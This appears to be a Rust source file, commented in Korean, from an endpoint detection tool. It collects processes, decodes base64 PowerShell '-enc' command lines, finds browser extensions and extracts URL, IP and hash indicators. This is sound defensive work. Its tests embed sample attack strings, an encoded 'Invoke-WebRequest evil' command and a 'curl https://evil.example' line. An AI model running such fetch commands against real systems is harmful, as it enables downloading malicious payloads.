//! 다른 관찰에서 나오는 subject 들 — `process` · `browser_extension` · `indicator`.
//!
//! `indicator` 는 파일도 레지스트리도 아니다. **이미 담은 관찰에서 뽑아낸다.**
//! 그래서 근거가 늘 따라붙고(`source_ref`), 근거 없는 지표는 만들어지지 않는다.

use remedy_artifacts::{
    BrowserExtensionRecord, CollectError, Harvest, IndicatorRecord, ProcessRecord, Scope,
};
use remedy_platform::read::{FsRead, ProcessRead};
use remedy_sdk::catalog::Subject;
use remedy_sdk::normalize;
use std::collections::BTreeSet;

// ─────────────────────────────────────────────────────────── process

/// 돌고 있는 프로세스.
pub fn processes<P: ProcessRead>(p: &P) -> Result<Harvest<ProcessRecord>, CollectError> {
    let raw = p
        .processes()
        .map_err(|e| CollectError::Other(e.to_string()))?;
    let mut h = Harvest::default();
    for r in raw {
        // **못 읽은 것을 빈 목록으로 흘려보내지 않는다.** 그러면 모듈을 겨눈
        // 룰이 조용히 미탐이 된다 — 끝난 프로세스는 여기 오지 않는다
        // (`ProcessRead::processes` · `RawProcess::modules_denied`).
        if r.modules_denied {
            h.absorb_denied(1, vec![format!("/proc/{}/maps", r.pid)]);
        }
        h.records.push(ProcessRecord {
            pid: r.pid,
            ppid: r.ppid,
            image_path: r.image_path,
            cmdline_decoded: decode_cmdline(&r.cmdline),
            cmdline: r.cmdline,
            args: r.args,
            user: r.user,
            start_time: r.start_time,
            // 플랫폼이 준 그대로다. Linux 는 `/proc/<pid>/maps` 로 채우고
            // Windows 는 열거가 unsafe 라 빈 채로 온다.
            modules: r.modules,
        });
    }
    Ok(h)
}

/// base64 로 감싼 조각을 풀어 붙인다.
///
/// **인코딩은 은폐 수단이지 실행 방식이 아니다.** 룰이 원문만 볼 수 있으면
/// `powershell -enc <base64>` 한 줄로 모든 문자열 룰이 무력해진다.
///
/// 원문을 지우지 않고 **뒤에 덧붙인다.** 바꿔치면 `cmdline_decoded contains "-enc"`
/// 처럼 감싼 사실 자체를 겨누는 룰이 못 맞는다.
pub fn decode_cmdline(cmdline: &str) -> String {
    let mut out = cmdline.to_string();
    let mut seen = BTreeSet::new();
    for token in cmdline.split([' ', '\t', '"', '\'']) {
        // 짧은 토큰은 base64 처럼 보일 뿐이다. 풀면 잡음만 는다.
        if token.len() < 16 || !token.bytes().all(is_base64_byte) {
            continue;
        }
        let Some(text) = decode_base64_text(token) else {
            continue;
        };
        if seen.insert(text.clone()) {
            out.push(' ');
            out.push_str(&text);
        }
    }
    normalize::nfc(&out)
}

fn is_base64_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'='
}

/// base64 를 풀어 **사람이 읽을 수 있는 문자열**이면 돌려준다.
///
/// PowerShell 의 `-enc` 는 UTF-16LE 다. UTF-8 로만 시도하면 그 자리가
/// `e\0c\0h\0o\0` 같은 널 섞인 문자열이 되어 룰이 맞지 않는다.
fn decode_base64_text(token: &str) -> Option<String> {
    use base64::Engine;
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(token)
        .ok()?;
    if bytes.len() < 4 {
        return None;
    }
    // 널 바이트가 절반쯤이면 UTF-16LE 다.
    let nulls = bytes.iter().filter(|&&b| b == 0).count();
    let text = if nulls * 3 >= bytes.len() {
        String::from_utf16(
            &bytes
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        )
        .ok()?
    } else {
        String::from_utf8(bytes).ok()?
    };
    // 제어문자 투성이면 우연히 풀린 이진 데이터다.
    let printable = text
        .chars()
        .filter(|c| !c.is_control() || *c == '\n' || *c == '\t')
        .count();
    if text.is_empty() || printable * 10 < text.chars().count() * 9 {
        return None;
    }
    Some(text)
}

// ─────────────────────────────────────────────────── browser_extension

/// 확장이 설치되는 자리는 `.../<프로필>/Extensions/<id>/<버전>/manifest.json` 이다.
pub fn browser_extensions<P: FsRead>(
    fs: &P,
    scope: &Scope,
) -> Result<Harvest<BrowserExtensionRecord>, CollectError> {
    let mut h = Harvest::default();
    // **구분자를 둘 다 본다.** `\manifest.json` 하나만 두던 동안 Linux 경로는
    // 영영 매치되지 않았고, 그 상태의 0건은 "확장이 없다" 로 읽혔다.
    // `split_extension_path` 는 처음부터 양쪽 구분자를 보고 있었다.
    for path in crate::config::files_with_ext(
        fs,
        scope,
        Subject::BrowserExtension,
        &["\\manifest.json", "/manifest.json"],
        &mut h,
    )? {
        let Some((browser, profile, ext_id)) = split_extension_path(&path) else {
            continue;
        };
        let (mut name, mut version) = (String::new(), String::new());
        if let Ok(Some(bytes)) = fs.read_file(&path, 1 << 20) {
            if let Ok(v) = serde_json::from_slice::<serde_json::Value>(&bytes) {
                name = v["name"].as_str().unwrap_or_default().to_string();
                version = v["version"].as_str().unwrap_or_default().to_string();
            }
        }
        h.records.push(BrowserExtensionRecord {
            browser,
            profile,
            ext_id,
            name: normalize::nfc(&name),
            version,
            path: path
                .rsplit_once(['\\', '/'])
                .map(|(d, _)| d.to_string())
                .unwrap_or(path),
        });
    }
    h.records.sort_by(|a, b| {
        (&a.browser, &a.profile, &a.ext_id).cmp(&(&b.browser, &b.profile, &b.ext_id))
    });
    h.records.dedup_by(|a, b| {
        (&a.browser, &a.profile, &a.ext_id) == (&b.browser, &b.profile, &b.ext_id)
    });
    Ok(h)
}

/// `.../<브라우저>/User Data/<프로필>/Extensions/<id>/<버전>/manifest.json` 에서
/// 브라우저·프로필·확장 id 를 뽑는다.
///
/// 확장 경로가 아니면 `None` — 모든 `manifest.json` 을 확장으로 세면 Node 패키지
/// 하나가 브라우저 확장으로 보고된다.
fn split_extension_path(path: &str) -> Option<(String, String, String)> {
    let parts: Vec<&str> = path.split(['\\', '/']).collect();
    let i = parts
        .iter()
        .rposition(|p| p.eq_ignore_ascii_case("Extensions"))?;
    // `Extensions/<id>/<버전>/manifest.json` — 뒤로 세 칸이 있어야 한다.
    if i + 3 >= parts.len() {
        return None;
    }
    let ext_id = parts[i + 1].to_string();
    let profile = parts.get(i.checked_sub(1)?)?.to_string();
    let browser = parts[..i]
        .iter()
        .rev()
        .find_map(|p| {
            let l = p.to_ascii_lowercase();
            [
                "chrome", "edge", "brave", "whale", "opera", "vivaldi", "chromium",
            ]
            .iter()
            .find(|b| l.contains(*b))
            .map(|b| b.to_string())
        })
        .unwrap_or_else(|| "unknown".into());
    Some((browser, profile, ext_id))
}

// ─────────────────────────────────────────────────────────── indicator

/// 이미 담은 관찰에서 지표를 뽑는다.
///
/// `source_ref` 는 `<subject>[<색인>].<필드>` 다. 근거가 늘 따라붙으므로
/// "이 지표가 어디서 나왔는가" 를 묻는 데 다른 자료가 필요하지 않다.
pub fn indicators(sources: &[(String, String)]) -> Harvest<IndicatorRecord> {
    let mut h = Harvest::default();
    let mut seen = BTreeSet::new();
    for (source_ref, text) in sources {
        for (kind, value) in scan_text(text) {
            if seen.insert((kind, value.clone())) {
                h.records.push(IndicatorRecord {
                    kind: kind.to_string(),
                    value,
                    source_ref: source_ref.clone(),
                });
            }
        }
    }
    h.records
        .sort_by(|a, b| (&a.kind, &a.value).cmp(&(&b.kind, &b.value)));
    h
}

/// 문자열 하나에서 지표를 훑는다. 정규식을 쓰지 않는 이유는 **여기가 수집
/// 경로**여서다 — 룰이 준 패턴이 아니라 우리가 고정한 형태만 찾으므로,
/// 손으로 훑는 편이 무엇을 찾는지 읽기 쉽고 정지 보장도 자명하다.
fn scan_text(text: &str) -> Vec<(&'static str, String)> {
    let mut out = Vec::new();
    for token in text.split([
        ' ', '\t', '\n', '\r', '"', '\'', '<', '>', '(', ')', ',', ';',
    ]) {
        let t = token.trim_matches(|c: char| matches!(c, '.' | '/' | '\\' | ':'));
        if t.is_empty() {
            continue;
        }
        let lower = t.to_ascii_lowercase();
        if lower.starts_with("http://")
            || lower.starts_with("https://")
            || lower.starts_with("ftp://")
        {
            out.push(("url", t.to_string()));
            if let Some(host) = host_of(t) {
                out.push(("domain", host));
            }
            continue;
        }
        if is_ipv4(t) {
            out.push(("ip", t.to_string()));
            continue;
        }
        // 해시는 길이와 문자 집합으로만 가른다. 32·40·64 는 각각 MD5·SHA1·SHA256 이다.
        if matches!(t.len(), 32 | 40 | 64) && t.bytes().all(|b| b.is_ascii_hexdigit()) {
            out.push(("hash", lower));
        }
    }
    out
}

fn host_of(url: &str) -> Option<String> {
    let rest = url.split_once("//")?.1;
    let host = rest.split(['/', '?', '#']).next()?;
    let host = host.rsplit_once('@').map(|(_, h)| h).unwrap_or(host);
    let host = host.split(':').next()?;
    if host.is_empty() || is_ipv4(host) {
        return None;
    }
    Some(host.to_ascii_lowercase())
}

fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    parts.len() == 4
        && parts.iter().all(|p| {
            !p.is_empty() && p.len() <= 3 && p.bytes().all(|b| b.is_ascii_digit()) && {
                p.parse::<u16>().map(|n| n <= 255).unwrap_or(false)
            }
        })
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 모듈 목록을 **못 읽은 프로세스**는 거부로 세어야 한다.
    ///
    /// 빈 목록으로 흘려보내면 그 프로세스는 *"모듈이 없다"* 가 되고, 모듈을
    /// 겨눈 룰이 조용히 미탐이 된다. 레지스트리 쪽에서 같은 자리를 이미
    /// 밟았다 — `Deny` 가 걸린 키가 **"자동 실행 없음"** 으로 읽혔다.
    #[test]
    fn a_process_whose_modules_were_refused_is_counted_as_denied() {
        use remedy_platform::read::RawProcess;

        struct Refused;
        impl ProcessRead for Refused {
            fn processes(&self) -> Result<Vec<RawProcess>, remedy_platform::PlatformError> {
                Ok(vec![
                    RawProcess {
                        pid: 4,
                        modules: vec!["/usr/lib/x86_64-linux-gnu/libc.so.6".into()],
                        ..Default::default()
                    },
                    RawProcess {
                        pid: 9,
                        modules_denied: true,
                        ..Default::default()
                    },
                ])
            }
        }

        let h = processes(&Refused).expect("수집");
        assert_eq!(h.denied_dirs, 1, "못 본 것을 없는 것으로 보고했다");
        assert_eq!(h.denied_paths, vec!["/proc/9/maps".to_string()]);
        assert_eq!(
            h.records[0].modules,
            vec!["/usr/lib/x86_64-linux-gnu/libc.so.6".to_string()],
            "플랫폼이 준 목록이 레코드까지 와야 한다"
        );
        assert!(h.records[1].modules.is_empty());
    }

    #[test]
    fn an_encoded_powershell_command_is_decoded_beside_the_original() {
        // 원문을 바꿔치면 `-enc` 를 겨누는 룰이 못 맞는다.
        // "Invoke-WebRequest evil" 의 UTF-16LE base64.
        let enc = {
            use base64::Engine;
            let utf16: Vec<u8> = "Invoke-WebRequest evil"
                .encode_utf16()
                .flat_map(|u| u.to_le_bytes())
                .collect();
            base64::engine::general_purpose::STANDARD.encode(utf16)
        };
        let got = decode_cmdline(&format!("powershell.exe -nop -enc {enc}"));
        assert!(got.contains("-enc"), "원문이 사라졌다: {got}");
        assert!(
            got.contains("Invoke-WebRequest evil"),
            "풀리지 않았다: {got}"
        );
    }

    #[test]
    fn random_binary_that_happens_to_decode_is_not_appended() {
        // 우연히 풀린 이진 데이터를 붙이면 스냅샷이 잡음으로 찬다.
        use base64::Engine;
        let blob = base64::engine::general_purpose::STANDARD
            .encode([0u8, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]);
        let line = format!("tool.exe {blob}");
        assert_eq!(decode_cmdline(&line), line);
    }

    #[test]
    fn a_short_token_is_not_treated_as_base64() {
        let line = "app.exe --mode=Fast";
        assert_eq!(decode_cmdline(line), line);
    }

    #[test]
    fn extension_path_yields_browser_profile_and_id() {
        let p = "c:\\users\\t\\appdata\\local\\google\\chrome\\user data\\Default\\Extensions\\abcd\\1.0_0\\manifest.json";
        let (b, pr, id) = split_extension_path(p).expect("확장 경로");
        assert_eq!(b, "chrome");
        assert_eq!(pr, "Default");
        assert_eq!(id, "abcd");
    }

    #[test]
    fn a_plain_manifest_json_is_not_an_extension() {
        // 모든 manifest.json 을 확장으로 세면 Node 패키지가 브라우저 확장이 된다.
        assert!(split_extension_path("c:\\proj\\node_modules\\x\\manifest.json").is_none());
    }

    #[test]
    fn indicators_carry_the_observation_they_came_from() {
        let src = vec![(
            "persistence[0].args".to_string(),
            "curl https://evil.example/a?b=1 10.0.0.5 aabbccddeeff00112233445566778899".to_string(),
        )];
        let h = indicators(&src);
        let kinds: Vec<&str> = h.records.iter().map(|r| r.kind.as_str()).collect();
        assert_eq!(
            kinds,
            vec!["domain", "hash", "ip", "url"],
            "{:?}",
            h.records
        );
        assert!(h
            .records
            .iter()
            .all(|r| r.source_ref == "persistence[0].args"));
        let dom = h.records.iter().find(|r| r.kind == "domain").unwrap();
        assert_eq!(dom.value, "evil.example");
    }

    #[test]
    fn a_url_whose_host_is_an_ip_does_not_become_a_domain() {
        let h = indicators(&[("x".into(), "http://10.0.0.5/a".into())]);
        assert!(
            !h.records.iter().any(|r| r.kind == "domain"),
            "{:?}",
            h.records
        );
    }

    #[test]
    fn a_version_number_is_not_an_ip() {
        let h = indicators(&[("x".into(), "app 1.2.3 build 999.999.999.999".into())]);
        assert!(h.records.is_empty(), "{:?}", h.records);
    }

    #[test]
    fn the_same_indicator_is_not_reported_twice() {
        let h = indicators(&[
            ("a".into(), "http://evil.example/x".into()),
            ("b".into(), "http://evil.example/x".into()),
        ]);
        assert_eq!(h.records.len(), 2, "url + domain 각각 하나여야 한다");
    }
}
